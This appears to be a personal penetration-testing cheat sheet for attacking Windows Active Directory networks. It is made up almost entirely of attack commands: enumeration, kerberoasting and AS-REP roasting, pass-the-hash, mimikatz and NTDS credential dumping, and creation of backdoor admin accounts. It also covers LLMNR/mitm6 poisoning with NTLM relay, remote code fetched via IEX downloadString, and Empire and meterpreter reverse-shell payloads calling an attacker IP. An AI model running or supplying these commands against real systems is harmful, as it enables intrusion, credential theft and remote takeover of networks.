 # Enumeration
1. Nmap*
2. Windapseach
3. LDAPdomainDump
4. Enum4linux*
5. GetADusers
6. SMBenum*
7. impacket*

**https://www.hackingarticles.in/active-directory-enumeration-rpcclient/**
# Post Exploitation 
1. PowerShell-Empire (AKA empire, no longer supported, CLI)
2. Covenant (successor to empire. Browser based GUI)
3. Metasploit Framework (CLI)

## smbmap 
- `smbmap <ipaddr>`
- `smbmap -R <share> -H <ipaddr>` (recursively list the contents of the directory)
- use -A to download
- use -q for quet mode (opposite of verbose)
- `smbmap -H <ipadd> -u <username> -p <password> -d <domain name>`

## Impacket 

#### GetNPUsers
- This is used to get users with 'No preauthentication' set. Can be used to get NTLM hashes
- `impacket-GetNPUsers domain.local/ -dc-ip <ip> -request'

#### GetUserSPNs
kerberoasting = get hash for *users* with service principal names set. domain name must be in DNS
- `impacket-GetUserSPNs domain.local/<username>:<password> -request`

#### GetADUsers
This script will try to find more AD users. 
- Needs user credetials
- `impacket-GetADUsers -all -dc-ip <ip addr> <domain>/<user>`
- `get-aduser -ldapfilter "(serviceprincipalname=*)" -Properties "serviceprincipalname"` --> run in vitim machine. 
## smbclient 
`smbclient //<ip>/<share>`
- no password for null auth

## CrackMapExec (CME)
CME is a very versatile tool.
- `cme <protocol> -i <ip> -u <username> -p <password> (or -H <hash> for pass the hash)`
example: `cme winrm -i 10.10.10.10 -u admin -p password`


- `cme smb -i <ip>` (for domain enum)
- `cme smb enum --shares`
- `cme smb enum --sessions`
- `cme smb enum --disks`
- `cme smb enum --loggon -users`
- `cme smb enum --users`
- `cme smb enum --groups`
- `cme smb enum --pass-pol`
- `cme smb enum --sam` (Needs admin privilege)
- `cme smb enum --lsa` (Needs admin privilege)
- `cme smb enum --ntds` (Needs domain admin privileges on DC)
- `cme smb -M mimikatz <ip> -u <user> -p <pass> --server.port <port> `
- `cme winrm -X <PowerShell commands>`
- `cme winrm -x <cmd.exe commands>`

## EvilWinRM
- `evil-winrm -u <user> -p <password> -i <IP addr>`
- `evil-winrm -u <user> -H <NTLM hash> -i <IP addr>`
- `evil-winrm -u <user> -p <password> -i <IP addr> -s <location of script>`

## Windows commands
- `Invoke-WebRequest -uri <http://<attacker ip>/<location to file> -OutFile <location, name and extension to save file>` (To download from attacker)
- `net user /add <username> <password>` (add new user)
- `net localgroup administrators <username> /add` (add local admin)

## Kerbrute
- `kerbrute userenum -d <domain name>`
## Responder
- `responder -I <interface> -wd`

## MSFVenom
stand-alone executable generation
- `msfvenom -l payloads` (to list all payloads and their description. can use `| grep <search term>` to focus output.)

## mitm6
- `sudo mitm6 (<int> or <domain>)`
- `impacket-ntlmrelayx -6 -wh <attacker.domain.domain> -t ldaps://winsrv12.domain.domain -l info` 
https://medium.com/@browninfosecguy/ipv6-exploitation-in-ad-environment-b22a7c3ec8af

# LDAP
- `ldapsearch -h 10.10.10.161 -x -s base namingcontexts` --> get FQDN

# nmap
- `nmap –script smb-check-vulns.nse –script-args=unsafe=1 -p445 [host]` --> smb vulns
- `nmap –script smb-enum-shares.nse –script-args=unsafe=1 -p445 [host]` --> smb shares
- `nmap –script smb-os-discovery.nse –script-args=unsafe=1 -p445  [host]` --> os discovery
- `nmap –script smb-enum-users.nse –script-args=unsafe=1 -p445 [host]` --> user enum
- `nmap -p 445 -script=smb-vuln-ms17-010.nse [host (or host range)]` --> eternal blue

# Bloodhound
- `bloodhound-python -u <user> -p <password> -ns <dc-ip> -d <domain.name> -c All`

accordian

# Responder 
- `sudo responder -I <int> -rdwv` 

# hashcat
- `hashcat --help | grep etype` --> get m
- `hashcat -m <mode> -a 0 crackme wordlist`

# Group policy prefrence 
- `findstr /s /I cpassword \\conda.local\sysvol\conda.local\policies\*.xml`
- PortSploit also contains a module (GetGPP)
	- `IEX(New-Object Net.WebClient).downloadString("<httpserver>")`
	- `Get-GPPPassword`

# MITM 6
- `mitm6 -d <domain>`
- `ntlmrelayx -6 -t ldaps://<dc-ip> -wh fakewpad.<domain> -l loot`

# SMB relay attack
/usr/share/responder 
- Edit Responder.conf 
	- SMB = OFF
	- HTTP = OFF
- `python3 Responder.py -I <int> -wrf -v`


/usr/share/doc/python-impacket/exmples

- make an targets file with ip addr (targets.txt)
- `python ntlmrelayx.py -tf targets.txt -smb2support`
- `python ntlmrelayx.py -tf targets.txt -smb2support -c 'stager payload'`
-  `python ntlmrelayx.py -tf targets.txt -smb2support -i`

empire

listener
- `listeners`
- `uselistener http`
- `info`
- `set Port 81`
- `set Host <attacker ip>` 
- `execute`

stager
- `usestager multi/launcher`
- `set Listener http`
- `generate`

agents
- `rename`
- `interact info`
- help
- `shell <command>`
- `mimikatz`
- `creds`


## alternate 
- `msfconsole` 
- `use exploit/multi/handler`
- `set LHOST <attaker ip>`
- `set LPORT 4545`
- `set payload windows/meterpreter/reverse_tcp`
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker ip> LPORT = 4545 X > smb_rev.exe` (msfpayload) -f exe -o smb_rev.exe
- `python smbrelayx.py -h <victim ip> -e ./smb_rev.exe`
- `migrate 964`


LLMNR poisioning --> ntlm relay --> empire payload--> shell

https://www.youtube.com/watch?v=b31KbDb-5DA

# LLMNR/NBT-NS Poisoning
- `python Responder.py -I eth0 -rdwv`









